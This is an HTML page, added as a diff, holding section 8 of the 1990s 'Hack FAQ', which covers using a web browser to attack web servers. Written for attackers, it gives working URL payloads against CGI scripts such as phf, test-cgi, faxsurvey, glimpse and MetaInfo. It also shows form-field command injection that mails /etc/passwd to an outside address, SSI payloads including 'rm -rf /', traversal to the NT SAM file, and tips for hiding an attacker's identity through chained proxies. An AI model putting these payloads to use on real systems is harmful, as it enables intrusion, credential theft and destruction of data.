@@ -1,0 +1,447 @@
+<!DOCTYPE  HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><HTML>
+<HEAD>
+ <META NAME="GENERATOR" CONTENT="SGML-Tools 1.0.6">
+ <TITLE>The Hack FAQ: The Web Browser as an Attack Tool</TITLE>
+ <LINK REL="next" HREF="hackfaq-9.html">
+ <LINK REL="previous" HREF="hackfaq-7.html">
+ <LINK REL="contents" HREF="hackfaq.html#toc8">
+</HEAD>
+<BODY BGCOLOR="black" VLINK="gray" TEXT="white" LINK="gray" HLINK="red">
+<A HREF="hackfaq-9.html">Next</A>
+<A HREF="hackfaq-7.html">Previous</A>
+<A HREF="hackfaq.html#toc8">Contents</A>
+<HR>
+<H2><A NAME="s8">8. The Web Browser as an Attack Tool</A></H2>
+
+<P>This section deals with using the Web Browser as an Attack Tool.
+<P>
+<H2><A NAME="ss8.1">8.1 What is phf?</A>
+</H2>
+
+<P>The phf file is an example CGI script that is used to update a phonebook style
+listing of people. By default a lot of sites have this file sitting in /cgi-bin/
+and don't even know it. You know, they installed everything to default. However
+the phf file behaves "differently" if thrown a newline (0a) character. Here's the
+common attack for a Unix server -
+<P>
+<PRE>
+
+&lt;http://thegnome.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd>
+
+Or better yet, a series of commands -
+
+&lt;http://thegnome.com/cgi-bin/phf?%0aid==haqr=>
+me=_phone=
+&lt;http://thegnome.com/cgi-bin/phf?%0als%20-la%20%7Esomeuser==>
+haqr==_phone=
+&lt;http://thegnome.com/cgi-bin/phf?%0acp%20/etc/passwd%20%7Esomeuser/passwd>
+%0A==haqr==_phone=
+~http://thegnome.com/~someuser/passwd &lt;http://thegnome.com/someuser/passwd>
+&lt;http://thegnome.com/cgi-bin/phf?%0arm%20%7Esomeuser/passwd=>
+=haqr==_phone=
+
+The above commands are
+
+id
+ls -la ~someuser
+cp /etc/passwd ~someuser/passwd
+(normal URL access to get the passwd file)
+rm ~someuser/passwd
+</PRE>
+<P>Obviously you get the point. You could try and access the files directly or
+move then to another location for retrieval. I've used a target OS of Unix
+as an example since it is the most common, although native OS commands for
+NT will work on an NT server just fine.
+<P>
+<H2><A NAME="ss8.2">8.2 What's the "test" hack?</A>
+</H2>
+
+<P>There is a test CGI script included with most servers that can be used to
+make sure environment variables and other info is being passed to the server
+properly during queries. This example file is called, appropriately, test-cgi
+on most systems. Here's how it works -
+<P>
+<PRE>
+
+&lt;http://thegnome.com/cgi-bin/test-cgi?\whatever>
+
+The response will be something like -
+
+CGI/1.0 test script report:
+
+argc is 0. argv is .
+
+SERVER_SOFTWARE = NCSA/1.4B
+SERVER_NAME = thegnome.com
+GATEWAY_INTERFACE = CGI/1.1
+SERVER_PROTOCOL = HTTP/1.0
+SERVER_PORT = 80
+REQUEST_METHOD = GET
+HTTP_ACCEPT = text/plain, application/x-html, application/html,
+text/html, text/x-html
+PATH_INFO =
+PATH_TRANSLATED =
+SCRIPT_NAME = /cgi-bin/test-cgi
+QUERY_STRING = whatever
+REMOTE_HOST = fifth.column.gov
+REMOTE_ADDR = 200.200.200.200
+REMOTE_USER =
+AUTH_TYPE =
+CONTENT_TYPE =
+CONTENT_LENGTH =
+
+Once again, the 0a character can be used to try and get this file to do other
+things, to say nothing of simply trying an asterisk -
+
+&lt;http://thegnome.com/cgi-bin/test-cgi?\help&amp;0a/bin/cat%20/etc/passwd>
+
+These might get you a list of files in /cgi-bin/ -
+
+&lt;http://thegnome.com/cgi-bin/test-cgi>?* HTTP/1.0
+&lt;http://thegnome.com/cgi-bin/test-cgi?x> *
+&lt;http://thegnome.com/cgi-bin/nph-test-cgi>?* HTTP/1.0
+&lt;http://thegnome.com/cgi-bin/nph-test-cgi?x> *
+</PRE>
+<P>
+<H2><A NAME="ss8.3">8.3 What about that "tilde" character? </A>
+</H2>
+
+<P>
+<P>
+<PRE>
+
+The ~ is used during a "resolve" of a URL by the server as a shorthand for
+getting directly to user files. During server setup an admin can define a UserDir
+to something like /public_html/ so that ~ replaces /public_html/ when getting to
+a user's directory. Some Unix servers that do not have a /public_html/ will
+attempt to resolve to the home directory listed in /etc/passwd. I have confirmed
+this on BSD with Apache web software, but I am pretty sure other
+platforms may be affected. For example, this URL might return some interesting
+info -
+
+~http://thegnome.com/~root &lt;http://thegnome.com/root>
+
+If the server wasn't locked down good enough, bingo! Root directory of the server,
+and you can get to every public readable file -
+
+~http://thegnome.com/~root/etc/passwd &lt;http://thegnome.com/root/etc/passwd>
+</PRE>
+<P>Some admins patch things with a symbolic link on the root of the file system to the
+top of the tree, but this still doesn't fix the second entry above. Only careful
+checking of the configuration of your specific web server as an admin will make sure
+you are okay. And not just &nbsp;root, but every user on the system, including putting
+a &nbsp; in from of bin, daemon, uucp, etc. could compromise a system. The account does
+not have to have a valid shell or password, just a home directory of / will usually
+do quite nicely.
+<P>
+<H2><A NAME="ss8.4">8.4 What is the jj.c problem?</A>
+</H2>
+
+<P>The demo cgi program jj.c calls /bin/mail without filtering user input, so any
+program based on jj.c could potentially be exploited by simply adding a &nbsp;
+followed by a Unix command. It may require a password, but two known passwords
+include HTTPdrocks and SDGROCKS. If you can retrieve a copy of the compiled
+program running strings on it will probably reveil the password.
+<P>Do a web search on jj.c to get a copy and study the code yourself if you have
+more questions.
+<P>
+<H2><A NAME="ss8.5">8.5 What's the deal with forms?</A>
+</H2>
+
+<P>Here's the typical example. A web author has a form on a page that allows the
+public to send email to a certain address. But what if the author is going to
+be on vacation? What if the address needs to be changed each month? By including
+the address in the form the web author doesn't have to change the CGI script.
+Outside of the normal fields for From:, Subject:, etc. there is usually something
+in the form like this -
+<P>
+<PRE>
+
+&lt;INPUT TYPE="hidden" NAME="HelpAddress" VALUE="help@thegnome.com &lt;mailto:VALUE=>">
+
+After clicking on the submit button, it goes to a CGI script. Once again it is
+typical to write out the info to a temp file and then read it back in to be sent to
+sendmail -
+
+/* code snippet in C, although you can do the same type thing in Perl */
+sprintf(buffer, "/usr/lib/sendmail -t %s &lt; %s", foo_address, input_file);
+system(buffer);
+
+A shell is being forked, and since in the code above the variables are being passed
+without being checked for extra stuff, you could copy the page locally
+(virtually every browser allows you to save the current document as a local HTML
+file). Once copied, edit the form to include the following -
+
+&lt;INPUT TYPE="hidden" NAME="HelpAddress"
+VALUE="help@thegnome.com &lt;mailto:VALUE=>;cat /etc/passwd | mail thegnome@5th.column.gov &lt;mailto:thegnome@5th.column.gov>">
+</PRE>
+<P>Note the addition including the semicolon. Since the semicolon tells the forked
+shell it has another completely separate command to run, which in this
+example sends the passwd file to a government spy.
+<P>It should be pointed out that for the most part you will have no idea that this
+type of technique is going to work until you try it. And look around, you will
+sometimes see these attempts at various places. It's always funny to see this
+entry in a guestbook -
+<P>From: fred@kissmybutt.com 
+<A HREF="mailto:fred@kissmybutt.com">mailto:fred@kissmybutt.com</A> (200.200.200.200, 7/7/96 09:10 a.m. CST)
+<P>
+<PRE>
+
+Loved your web page. Looks nice.;mail phil@idiot.com &lt;mailto:phil@idiot.com> &lt; cat /etc/passwd
+</PRE>
+<P>Not only does it have Phil's email address, but his real IP address and a time
+stamp. Ouch! So hackers, if you want to be evil try forging your IP address
+and sending the passwd file to a remailer.
+<P>
+<H2><A NAME="ss8.6">8.6 What will this look like in the target's log files?</A>
+</H2>
+
+<P>Here is an example:
+<P>
+<PRE>
+
+thegnome.com unknown - [27/Sep/1996:02:28:29 +0000] "GET /cgi-bin/phf?Jser
+ver=dummy.edu%0Aid%0A==foo==_phone=
+==_school== HTTP/1.0" 200 116
+thegnome.com unknown - [27/Sep/1996:02:29:04 +0000] "GET /cgi-bin/phf?Jser
+ver=dummy.edu%0Acat%20/etc/passwd%0A==foo==
+_phone===_school== HTTP/1.0" 200 7241
+thegnome.com unknown - [27/Sep/1996:02:29:57 +0000] "GET /cgi-bin/phf?Jser
+ver=dummy.edu%0Auname%20-a%0A==foo==e_phone===_school== HTTP/1.0" 200 154
+thegnome.com unknown - [27/Sep/1996:02:31:30 +0000] "GET /cgi-bin/phf?Jser
+ver=dummy.edu%0Acat%20/etc/shadow%0A==foo==
+_phone===_school== HTTP/1.0" 200 105
+thegnome.com unknown - [27/Sep/1996:02:32:06 +0000] "GET /cgi-bin/phf?Jser
+ver=dummy.edu%0Als%20-la%20/etc/shadow%0A==foo=name=_phone===_school== HTTP/1.0" 200 175
+anothergnome.com unknown - [27/Sep/1996:02:35:44 +0000] "GET /cgi-bin/phf?
+Jserver=dummy.edu%0Als%20-la%20/etc/shadow%0A==foo=nickname=_phone===_school== HTTP/1.0" 200 175
+anothergnome.com unknown - [27/Sep/1996:02:38:24 +0000] "GET /cgi-bin/phf?
+Jserver=dummy.edu%0Agrep%20ftp%20/etc/passwd%0A==foo=
+=_phone===_school== HTTP/1.0" 200 138
+anothergnome.com unknown - [27/Sep/1996:02:40:21 +0000] "GET /cgi-bin/phf?
+Jserver=dummy.edu%0Acp%20/etc/passwd%20%7Eftp/incoming%0A==f
+oo==_phone===_school== HTTP/1.0" 200 119
+anothergnome.com unknown - [27/Sep/1996:02:40:46 +0000] "GET /cgi-bin/phf?
+Jserver=dummy.edu%0Aid%0A==foo==_ph
+one===_school== HTTP/1.0" 200 116
+anothergnome.com unknown - [27/Sep/1996:02:41:22 +0000] "GET /cgi-bin/phf?
+Jserver=dummy.edu%0Als%0A==foo==_ph
+one===_school== HTTP/1.0" 200 300
+anothergnome.com unknown - [27/Sep/1996:02:43:18 +0000] "GET /cgi-bin/phf?
+Jserver=dummy.edu%0Als%20%7Eftp/incoming%0A==foo=ckname=_phone===_school== HTTP/1.0"200 107
+</PRE>
+<P>Two attacks. The first one involves trying to access /etc/passwd and /etc/shadow,
+with attempts to determine what id httpd is running under, with failed attempts
+at the passwd file. The second is a little more interesting, since /etc/shadow
+can't be accessed directly, the attacker tries to move the file to anonymous
+FTP's incoming directory for an alternate method of retrieval.
+<P>
+<H2><A NAME="ss8.7">8.7 What's the deal with Server-Side Includes?</A>
+</H2>
+
+<P>A Server-Side Include (SSI) is a way to imbed special operations and commands
+into an HTML document. The potential for abuse is there when they are combined
+with CGI and the modification of HTML.
+<P>The biggest example is the guestbook. Typically the common guestbook serves no
+real purpose except as a vanity, but they can be used as a point of attack. The
+idea is simple:
+<P>Hacker fills out guestbook form and includes an SSI.
+Via CGI, the form is appended to the guestbook which is typically just an
+HTML document.
+Next person that views the guestbook activates the SSI.
+<P>So what is bad? Consider these SSIs:
+<P>
+<PRE>
+
+&lt;!--#exec cmd="rm -rf /"-->
+
+&lt;!--#exec cmd="mail me@my.org &lt;mailto:me@my.org> &lt; cat /etc/passwd"-->
+
+&lt;!--#exec cmd="chmod 777 ~ftp/incoming/uploaded_hack_script"-->
+&lt;!--#exec cmd="~ftp/incoming/uploaded_hack_script"-->
+
+&lt;!--#exec cmd="find / -name foobar -print"-->
+</PRE>
+<P>Well, the first one erases everything that the id that httpd is running under owns.
+This is a little psycho, but should give you an idea on how serious this is (hope
+you're not running that httpd as root!). The next two give you a couple of more
+ideas to run with. And the last one, pasted into the document a couple hundred times
+will grind a server to a halt the next time that guestbook is accessed.
+<P>
+<H2><A NAME="ss8.8">8.8 What if SSIs are turned on but includes are stripped from user input?</A>
+</H2>
+
+<P>If SSIs are allowed, you may still have a way to use them. If there is another
+method of user input, such as a completely separate script, it could possibly
+be exploited. Granted, if you could access the system via a separate script you
+probably won't be messing with SSI. But if an anon FTP "/incoming" directory is
+in place, and you can view an uploaded file via your browser, you could include
+the SSI stuff into an HTML file you've uploaded and then access it to run the
+SSI. Also, local users to the web server (even if they have only FTP access for
+uploading pages, common for an ISP) could do the same things.
+<P>
+<H2><A NAME="ss8.9">8.9 What are SSL and SHTTP?</A>
+</H2>
+
+<P>SSL (Secure Socket Layer) and SHTTP (Secure HTTP) and are proposed encryption
+and user authentication standards for the Web. The basic idea behind the
+encryption is to encode the text of a message with a key. There are two ways
+to encrypt -- 1) symmetric - the same key is used for encoding and decoding,
+and 2) asymmetric - one key is used for encoding and another for decoding.
+In the latter there is a pair of keys that work together, with one being the
+public key for encoding, and the other being a private key for decoding. A
+typical implementation would use both - an asymmetric system would be used to
+transmit a symmetric key good for the current session.
+<P>For this to work in a web environment, you need the scheme built into the
+browser and the server. SSL is Netscape's answer. It uses low level encryption
+to encrypt transactions in higher-level protocols such as HTTP, NNTP and FTP.
+SSL is (currently) only for Netscape browsers and some Netscape servers. I have
+not had experience with this to a great extent, but SSL's main strength lies in
+encrypting the messages. The client authentication really isn't happening yet,
+and until some type of universal signature method is used (like Verisign) to
+sign clients, the only advantage is the message encryption. There is still no
+guarantee that you are who you say you are. Layman's terms? Look in Security
+Preferences under the Options menu in Netscape and look at your Site
+Certificates. These can be used to create a secure connection. You could still
+send a fake credit card number and claim you are Joe Blow, but at least your
+message could not be intercepted ;-)
+<P>SHTTP has been proposed by CommerceNet, a coalition of businesses interested
+in commercial Internet usage. It only works with HTTP, but is a bit more
+flexible than SSL. Currently SHTTP is implemented for the Open Marketplace
+Server from Open Market, Inc on the server side, and Secure HTTP Mosaic on the
+client side.
+<P>
+<H2><A NAME="ss8.10">8.10 How can I attack "anonymously"?</A>
+</H2>
+
+<P>There are a couple of ways to do this. First off, you could use a proxy. In the
+log files the proxy's address will be there, not yours. Of course the disadvantage
+is in case the target contacts the proxy site and the proxy site supplies the target
+with log info.
+<P>It is possible, even desireable, to chain proxies to cover your tracks. This assumes
+there are no limitations on the proxy, such as they only allow certain addresses to
+be proxied.
+<P>Of course since you don't need a browser to hack (telnet targetaddress 80 will work
+just the same), you can use traditional hack methods such as IP address spoofing or
+attacking from another location other than your home account. Using methods like
+these will probably mean you'll need to tack on a "|mail myaccount@some.remailer"
+onto the end of each attempt so you can see the results.
+<P>
+<H2><A NAME="ss8.11">8.11 What is the "asp dot" attack?</A>
+</H2>
+
+<P>Well, it's hardly an attack but worth mentioning. Microsoft's Active Server Pages
+are "dynamic" pages, and are often used to do things such as control access to
+other pages or systems (I've seen SQL inside of asp pages). Obviously accessing
+the page's source would give the browsing party this info, which is usually not
+the intent of the author.
+<P>Instead of accessing like so:
+<P>http://www.nmrc.org/secret/files/default.asp
+<P>add a dot on the end:
+<P>http://www.nmrc.org/secret/files/default.asp.
+<P>and this yields the source code of the NT server's html page.
+This impacts NT servers not running SP2 and its post patches or SP3.
+<P>
+<H2><A NAME="ss8.12">8.12 What is the campas attack?</A>
+</H2>
+
+<P>The campas attack refers to an old NCSA script called campas.sh which
+accepted newlines. For example:
+<P>
+<PRE>
+
+&lt;http://victim.nmrc.org/cgi-bin/campas?%0acat%0a/etc/passwd%0a>
+</PRE>
+<P>This is old (version 1.2) and typically not found on most systems.
+<P>
+<H2><A NAME="ss8.13">8.13 What is the count.cgi attack?</A>
+</H2>
+
+<P>Versions earlier than 2.4 are susceptable to buffer overflows. The
+version of count.cgi is 2.5. Exploit code can be found at Rootshell.
+<P>
+<H2><A NAME="ss8.14">8.14 What is the faxsurvey attack?</A>
+</H2>
+
+<P>If the HylaFAX package is installed (common on some older Linux
+distributions), you can send arbitrary commands running as the
+UID of the web server:
+<P>
+<PRE>
+
+&lt;http://victim.nmrc.org/cgi-bin/faxsurvey?/bin/cat%20/etc/passwd>
+</PRE>
+<P>
+<H2><A NAME="ss8.15">8.15 What about finger.cgi?</A>
+</H2>
+
+<P>Found on some systems, it allows you to finger a user via your
+web browser. The fingered site has the web server's IP address in
+their logs, not yours. If a site has this cgi script installed
+but finger traffic is blocked at their firewall, you could possibly
+finger hosts behind the firewall:
+<P>
+<PRE>
+
+&lt;http://victim.nmrc.org/cgi-bin/finger\?thegnome@vortex.nmrc.org>
+</PRE>
+<P>
+<H2><A NAME="ss8.16">8.16 What is the glimpse exploit?</A>
+</H2>
+
+<P>If a site is running Glimpse HTTP and uses the standard scripts,
+arbitrary commands can be issued. This is a long line of text that
+is wrapped, but you should be able to figure it out:
+<P>
+<PRE>
+
+|http://victim.nmrc.org/cgi-bin/aglimpse/80|IFS=5 &lt;http://victim.nmrc.org/cgi-bin/aglimpse/80IFS=5>;CMD=5mail5thegno
+me\@nmrc.org\ &lt;mailto:me\@nmrc.org\>passwd;eval$CMD
+</PRE>
+<P>
+<H2><A NAME="ss8.17">8.17 What are some other CGI scripts that allow remote command execution?</A>
+</H2>
+
+<P>Anything below version 2.9932 of the Htmlscript CGI allows for
+remote execution of commands. So does versions earlier than 1.2 of
+info2www. Also earlier versions of view_source.cgi, webdist.cgi,
+webgais.cgi, and websendmail.cgi are vulnerable.
+<P>I don't have the syntax handy, so look at the multitude
+of other web sploits in this FAQ and guess the url... ;-)
+<P>
+<H2><A NAME="ss8.18">8.18 What are the MetaInfo attacks?</A>
+</H2>
+
+<P>MetaInfo puts out a couple of NT products, such as MetaIP and a port of
+the Unix Sendmail program. These can be remotely managed by a web browser
+at port 5000 (the default). These can be exploited.
+<P>For the MetaInfo Sendmail:
+<P>
+<PRE>
+
+&lt;http://nt.nmrc.org:5000/../../winnt/repair/sam>. &lt;- Gets the SAM
+&lt;http://nt.nmrc.org:5000/../smusers.txt> &lt;- Gets the POP3 password file
+
+For MetaIP (note 3 nested levels back to c:\ instead of 2):
+
+&lt;http://nt.nmrc.org:5000/../../../winnt/repair/sam>. &lt;- Gets the SAM
+
+You can also execute arbitrary commands (this assumes the Sendmail):
+
+&lt;http://nt.nmrc.org:5000/../../winnt/system32/net.exe?use%20> etc etc
+</PRE>
+<P>With this you can have all kinds of fun, especially if the Resource
+Kit is used, as there are a large number of command line utilities you
+can use. If the NT box is the sendmail server and the firewall, odds
+are you will be able to own the entire company.
+<P>I looked all over MetaInfo's web site and am unsure if this stuff has
+been patched (Jeff Forristal posted a message about this in June of
+1998 to BugTraq).
+<P>
+<P>
+<HR>
+<A HREF="hackfaq-9.html">Next</A>
+<A HREF="hackfaq-7.html">Previous</A>
+<A HREF="hackfaq.html#toc8">Contents</A>
+</BODY>
+</HTML>
